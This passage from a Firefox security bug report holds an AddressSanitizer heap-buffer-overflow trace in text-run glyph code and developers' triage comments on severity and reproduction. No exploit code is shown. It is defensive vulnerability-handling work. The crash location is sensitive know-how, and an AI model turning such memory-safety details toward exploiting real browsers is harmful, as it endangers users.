    #48 0x7fcef4112002 in mozilla::dom::ElementBinding::scrollBy(JSContext*, JS::Handle&lt;JSObject*&gt;, mozilla::dom::Element*, JSJitMethodCallArgs const&amp;) /home/worker/workspace/build/src/obj-firefox/dom/bindings/ElementBinding.cpp:2492:7
    #49 0x7fcef45cdd27 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2953:13
    #50 0x7fcefa0cc04f in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:282:15
    #51 0x7fcefa0cc04f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&amp;, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:448
    #52 0x7fcefa0b2970 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:499:12
    #53 0x7fcefa0b2970 in Interpret(JSContext*, js::RunState&amp;) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2955
    #54 0x7fcefa097c9b in js::RunScript(JSContext*, js::RunState&amp;) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:394:12
    #55 0x7fcefa0cc366 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&amp;, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:466:15
    #56 0x7fcefa0cca42 in js::Call(JSContext*, JS::Handle&lt;JS::Value&gt;, JS::Handle&lt;JS::Value&gt;, js::AnyInvokeArgs const&amp;, JS::MutableHandle&lt;JS::Value&gt;) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:512:10
    #57 0x7fcefaa9cd1c in JS::Call(JSContext*, JS::Handle&lt;JS::Value&gt;, JS::Handle&lt;JS::Value&gt;, JS::HandleValueArray const&amp;, JS::MutableHandle&lt;JS::Value&gt;) /home/worker/workspace/build/src/js/src/jsapi.cpp:2878:12
    #58 0x7fcef4242c05 in mozilla::dom::BlobCallback::Call(JSContext*, JS::Handle&lt;JS::Value&gt;, mozilla::dom::Blob*, mozilla::ErrorResult&amp;) /home/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLCanvasElementBinding.cpp:81:8
    #59 0x7fcef475613f in Call /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/HTMLCanvasElementBinding.h:180:12
    #60 0x7fcef475613f in mozilla::dom::CanvasRenderingContextHelper::ToBlob(JSContext*, nsIGlobalObject*, mozilla::dom::BlobCallback&amp;, nsAString_internal const&amp;, JS::Handle&lt;JS::Value&gt;, mozilla::ErrorResult&amp;)::EncodeCallback::ReceiveBlob(already_AddRefed&lt;mozilla::dom::Blob&gt;) /home/worker/workspace/build/src/dom/canvas/CanvasRenderingContextHelper.cpp:56
    #61 0x7fcef2acde86 in mozilla::dom::EncodingCompleteEvent::Run() /home/worker/workspace/build/src/dom/base/ImageEncoder.cpp:105:12
    #62 0x7fcef0217012 in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1264:7
    #63 0x7fcef02138c0 in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:389:10
    #64 0x7fcef10322bf in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21
    #65 0x7fcef0fa3658 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:238:3
    #66 0x7fcef0fa3658 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:231
    #67 0x7fcef0fa3658 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:211
    #68 0x7fcef63ffdbf in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3
    #69 0x7fcef9a88d81 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19
    #70 0x7fcef9c5243c in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4476:10
    #71 0x7fcef9c53f38 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&amp;) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4654:8
    #72 0x7fcef9c551fc in XRE_main(int, char**, mozilla::BootstrapConfig const&amp;) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4745:16
    #73 0x4dffaf in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:237:10
    #74 0x4dffaf in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:308
    #75 0x7fcf0b63282f in __libc_start_main /build/glibc-t3gR2i/glibc-2.23/csu/../csu/libc-start.c:291
    #76 0x41c3d8 in _start (/home/ifratric/p0/latest/firefox/firefox+0x41c3d8)

0x611000721ecc is located 0 bytes to the right of 204-byte region [0x611000721e00,0x611000721ecc)
allocated by thread T0 here:
    #0 0x4b2e4b in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3
    #1 0x7fcef25b9900 in AllocateStorageForTextRun /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:122:21
    #2 0x7fcef25b9900 in Create /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:139
    #3 0x7fcef25b9900 in gfxFontGroup::MakeTextRun(unsigned char const*, unsigned int, gfxTextRunFactory::Parameters const*, unsigned int, gfxMissingFontRecorder*) /home/worker/workspace/build/src/gfx/thebes/gfxTextRun.cpp:2075
    #4 0x7fcef6ff6f49 in BuildTextRunsScanner::BuildTextRunForFrames(void*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:2394:17
    #5 0x7fcef6fefe0b in BuildTextRunsScanner::FlushFrames(bool, bool) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1633:17
    #6 0x7fcef6ffb09d in BuildTextRunsScanner::ScanFrame(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1902:9
    #7 0x7fcef6ffb72f in BuildTextRunsScanner::ScanFrame(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1942:5
    #8 0x7fcef6ffb72f in BuildTextRunsScanner::ScanFrame(nsIFrame*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1942:5
    #9 0x7fcef7003a8a in BuildTextRuns /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:1534:7
    #10 0x7fcef7003a8a in nsTextFrame::EnsureTextRun(nsTextFrame::TextRunType, mozilla::gfx::DrawTarget*, nsIFrame*, nsLineList_iterator const*, unsigned int*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:2860
    #11 0x7fcef703d429 in nsTextFrame::AddInlineMinISizeForFlow(nsRenderingContext*, nsIFrame::InlineMinISizeData*, nsTextFrame::TextRunType) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:8329:5
    #12 0x7fcef70405ef in nsTextFrame::AddInlineMinISize(nsRenderingContext*, nsIFrame::InlineMinISizeData*) /home/worker/workspace/build/src/layout/generic/nsTextFrame.cpp:8499:7
    #13 0x7fcef6e1a982 in nsContainerFrame::DoInlineIntrinsicISize(nsRenderingContext*, nsIFrame::InlineIntrinsicISizeData*, nsLayoutUtils::IntrinsicISizeType) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:897:9
    #14 0x7fcef6e1a982 in nsContainerFrame::DoInlineIntrinsicISize(nsRenderingContext*, nsIFrame::InlineIntrinsicISizeData*, nsLayoutUtils::IntrinsicISizeType) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:897:9
    #15 0x7fcef6d9f622 in nsBlockFrame::GetMinISize(nsRenderingContext*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:774:11
    #16 0x7fcef6e1b150 in ShrinkWidthToFit /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:5566:22
    #17 0x7fcef6e1b150 in nsContainerFrame::ComputeAutoSize(nsRenderingContext*, mozilla::WritingMode, mozilla::LogicalSize const&amp;, int, mozilla::LogicalSize const&amp;, mozilla::LogicalSize const&amp;, mozilla::LogicalSize const&amp;, nsIFrame::ComputeSizeFlags) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:942
    #18 0x7fcef6e2260e in nsFrame::ComputeSize(nsRenderingContext*, mozilla::WritingMode, mozilla::LogicalSize const&amp;, int, mozilla::LogicalSize const&amp;, mozilla::LogicalSize const&amp;, mozilla::LogicalSize const&amp;, nsIFrame::ComputeSizeFlags) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:4822:24
    #19 0x7fcef6d4fb36 in FloatMarginISize(mozilla::ReflowInput const&amp;, int, nsIFrame*, mozilla::SizeComputationInput const&amp;) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:692:5
    #20 0x7fcef6d4c21f in mozilla::BlockReflowInput::FlowAndPlaceFloat(nsIFrame*) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:757:30
    #21 0x7fcef6d4b143 in mozilla::BlockReflowInput::AddFloat(nsLineLayout*, nsIFrame*, int) /home/worker/workspace/build/src/layout/generic/BlockReflowInput.cpp:627:14
    #22 0x7fcef6d21369 in AddFloat /home/worker/workspace/build/src/layout/generic/nsLineLayout.h:190:12
    #23 0x7fcef6d21369 in nsLineLayout::ReflowFrame(nsIFrame*, nsReflowStatus&amp;, mozilla::ReflowOutput*, bool&amp;) /home/worker/workspace/build/src/layout/generic/nsLineLayout.cpp:979
    #24 0x7fcef6dcb7bb in nsBlockFrame::ReflowInlineFrame(mozilla::BlockReflowInput&amp;, nsLineLayout&amp;, nsLineList_iterator, nsIFrame*, LineReflowStatus*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:4153:3
    #25 0x7fcef6dca446 in nsBlockFrame::DoReflowInlineFrames(mozilla::BlockReflowInput&amp;, nsLineLayout&amp;, nsLineList_iterator, nsFlowAreaRect&amp;, int&amp;, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3954:5
    #26 0x7fcef6dc0d6c in nsBlockFrame::ReflowInlineFrames(mozilla::BlockReflowInput&amp;, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3828:9
    #27 0x7fcef6dafacf in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2834:5
    #28 0x7fcef6dafacf in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370
    #29 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&amp;, mozilla::ReflowInput const&amp;, nsReflowStatus&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3
    #30 0x7fcef6dc6e8d in nsBlockReflowContext::ReflowBlock(mozilla::LogicalRect const&amp;, bool, nsCollapsingMargin&amp;, int, bool, nsLineBox*, mozilla::ReflowInput&amp;, nsReflowStatus&amp;, mozilla::BlockReflowInput&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockReflowContext.cpp:306:3
    #31 0x7fcef6dbc4da in nsBlockFrame::ReflowBlockFrame(mozilla::BlockReflowInput&amp;, nsLineList_iterator, bool*) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:3462:7
    #32 0x7fcef6dafafa in ReflowLine /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2831:5
    #33 0x7fcef6dafafa in nsBlockFrame::ReflowDirtyLines(mozilla::BlockReflowInput&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:2370
    #34 0x7fcef6da5c1a in nsBlockFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&amp;, mozilla::ReflowInput const&amp;, nsReflowStatus&amp;) /home/worker/workspace/build/src/layout/generic/nsBlockFrame.cpp:1237:3
    #35 0x7fcef6e0ada0 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, mozilla::ReflowOutput&amp;, mozilla::ReflowInput const&amp;, mozilla::WritingMode const&amp;, mozilla::LogicalPoint const&amp;, nsSize const&amp;, unsigned int, nsReflowStatus&amp;, nsOverflowContinuationTracker*) /home/worker/workspace/build/src/layout/generic/nsContainerFrame.cpp:1028:3
    #36 0x7fcef6e09555 in nsCanvasFrame::Reflow(nsPresContext*, mozilla::ReflowOutput&amp;, mozilla::ReflowInput const&amp;, nsReflowStatus&amp;) /home/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:711:5

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/worker/workspace/build/src/gfx/thebes/gfxFont.h:785:46 in IsSimpleGlyph
Shadow bytes around the buggy address:
  0x0c22800dc380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c22800dc390: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x0c22800dc3a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c22800dc3b0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
  0x0c22800dc3c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=&gt;0x0c22800dc3d0: 00 00 00 00 00 00 00 00 00[04]fa fa fa fa fa fa
  0x0c22800dc3e0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd
  0x0c22800dc3f0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd
  0x0c22800dc400: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
  0x0c22800dc410: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0c22800dc420: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==104545==ABORTING</pre></div><div class="change-set" id="c1"><div class="comment" data-id="12107250" data-no="1"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-1" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" ><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" ><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-1"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-1" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c1">Comment 1</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-01 09:14 PST" data-time="1488388497">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-1">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-1" data-comment-id="12107250">Milan or Jonathan, this looks like your bailiwick(s)? That or Dan or someone else who knows about our flexbox implementation.</pre><div class="activity"><div class="change">Group: firefox-core-security &rarr; core-security</div><div class="change">Component: Untriaged &rarr; Graphics: Text</div><div class="change">Flags: needinfo?(milan)</div><div class="change">Flags: needinfo?(jfkthame)</div><div class="change">Product: Firefox &rarr; Core</div></div></div><div class="change-set" id="a94779_456486"><div class="change" id="aa94779_456486">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_456486" id="a94779_456486"><img src="https://secure.gravatar.com/avatar/afff8630fb0a0c0a44853cd700ac0a4d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_456486" id="a94779_456486"><a class="email " href="/user_profile?user_id=456486" > <span class="fna">Milan Sreckovic [:milan] (needinfo for best results)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a94779_456486"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a94779_456486">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a94779_456486">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-02 10:16 PST" data-time="1488478588">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Keywords: <a href="/buglist.cgi?keywords=sec-audit&amp;resolution=---">sec-audit</a></div></div></div><div class="change-set" id="c2"><div class="comment" data-id="12111028" data-no="2"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-2" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_451704" id="a94779_456486"><img src="https://secure.gravatar.com/avatar/6168ea97fda0cefa449331e59b24e8f7?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_451704" id="a94779_456486"><a class="email " href="/user_profile?user_id=451704" > <span class="fna">Liz Henry (:lizzard Please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-2"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-2" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c2">Comment 2</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-02 10:33 PST" data-time="1488479596">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-2">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-2" data-comment-id="12111028">Tracking for 53 since 53 release falls within the 90-day window; release date is April 18th.</pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox53&amp;o1=isnotempty">status-firefox53</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox53&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox54&amp;o1=isnotempty">status-firefox54</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox54&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox53&amp;o1=isnotempty">tracking-firefox53</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox53&amp;o1=equals&amp;v1=%2B">+</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox54&amp;o1=isnotempty">tracking-firefox54</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox54&amp;o1=equals&amp;v1=%2B">+</a></div></div></div><div class="change-set" id="c3"><div class="comment" data-id="12111030" data-no="3"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-3" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a94779_456486"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a94779_456486"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-3"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-3" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c3">Comment 3</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-02 10:34 PST" data-time="1488479680">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-3">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-3" data-comment-id="12111030">&quot;sec-audit&quot; is not &quot;investigate a known bug&quot;, it's &quot;we fixed a bug, let's look to see if other places use this bad pattern&quot;. This is a demonstrable crash, nothing to &quot;audit&quot;.

buffer overflows are using sec-high or sec-critical. Even if it's only reading random crap into a glyph that's then displayed, it might be possible to get that data back out and a memory leak can lead to e.g. ASLR bypasses.</pre></div><div class="change-set" id="a95884_1689"><div class="change" id="aa95884_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a95884_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a95884_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a95884_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a95884_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a95884_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-02 10:34 PST" data-time="1488479693">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Keywords: <a href="/buglist.cgi?keywords=sec-audit&amp;resolution=---">sec-audit</a> &rarr; <a href="/buglist.cgi?keywords=sec-high&amp;resolution=---">sec-high</a></div></div></div><div class="change-set" id="a96155_75935"><div class="change" id="aa96155_75935">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_75935" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/a10f7f199c75a9a5a1eb347730524a7a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_75935" id="a96155_75935"><a class="email " href="/user_profile?user_id=75935" > <span class="fna">Ryan VanderMeulen [:RyanVM]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a96155_75935"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a96155_75935">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a96155_75935">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-02 10:39 PST" data-time="1488479964">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox51&amp;o1=isnotempty">status-firefox51</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox51&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox52&amp;o1=isnotempty">status-firefox52</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox52&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr45&amp;o1=isnotempty">status-firefox-esr45</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr45&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=isnotempty">status-firefox-esr52</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr52&amp;o1=equals&amp;v1=affected">affected</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox52&amp;o1=isnotempty">tracking-firefox52</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox52&amp;o1=equals&amp;v1=%3F">?</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr45&amp;o1=isnotempty">tracking-firefox-esr45</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr45&amp;o1=equals&amp;v1=%3F">?</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_tracking_firefox_esr52&amp;o1=isnotempty">tracking-firefox-esr52</a>:
          --- &rarr; <a href="/buglist.cgi?f1=cf_tracking_firefox_esr52&amp;o1=equals&amp;v1=%3F">?</a></div></div></div><div class="change-set" id="c4"><div class="comment" data-id="12111061" data-no="4"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-4" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_329583" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_329583" id="a96155_75935"><a class="email " href="/user_profile?user_id=329583" > <span class="fna">Jonathan Kew (:jfkthame)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-4"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-4" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c4">Comment 4</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-02 10:43 PST" data-time="1488480215">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-4">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-4" data-comment-id="12111061">Offhand, this looks like the sort of thing we get when we use a &quot;stale&quot; textrun that no longer corresponds to the frame(s) it is associated with. Mats has done an awesome job of tracking down some stuff like this in the past; any insights here?

(I'll go update an ASAN build and see if I can reproduce this shortly...)</pre><div class="activity"><div class="change">Flags: needinfo?(jfkthame) &rarr; needinfo?(mats)</div></div></div><div class="change-set" id="c5"><div class="comment" data-id="12111159" data-no="5"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-5" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_278074" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/cd9b85b2e112bd7941b21ad03f42604e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_278074" id="a96155_75935"><a class="email " href="/user_profile?user_id=278074" > <span class="fna">Daniel Holbert [:dholbert]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-5"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-5" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c5">Comment 5</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-02 11:05 PST" data-time="1488481554">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-5">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-5" data-comment-id="12111159">I can't reproduce in my locally-built ASAN build (on Linux64), nor can I reproduce in one of our published ASAN trunk builds (from &quot;mozilla-central optimized builds&quot; link on <a rel="nofollow" href="https://developer.mozilla.org/en-US/docs/Mozilla/Testing/Firefox_and_Address_Sanitizer">https://developer.mozilla.org/en-US/docs/Mozilla/Testing/Firefox_and_Address_Sanitizer</a> )

That leads me to believe that either:
 (a) there's a platform/environment difference that matters for making this reproducible.
 (b) OR perhaps Ivan is using an older build of Firefox and this has already been fixed in trunk.
 (c) OR perhaps the bug only reproduces a small fraction of the time.

Ivan, could you clarify:
 - what platform you're testing on.
 - what version of Firefox you were testing (either a changeset ID, or a link to where you got the source used, would be great. If you still have the build around, the &quot;Built from&quot; link at about:buildconfig would be awesome.
 - how reproducible the issue is for you (does it fail 100% of the time?)

(Alternately/also, if anyone else has tested this &amp; has been able to reproduce, please say so.)</pre><div class="activity"><div class="change">Flags: needinfo?(ifratric)</div></div></div><div class="change-set" id="c6"><div class="comment" data-id="12111598" data-no="6"
       data-tags="">
    
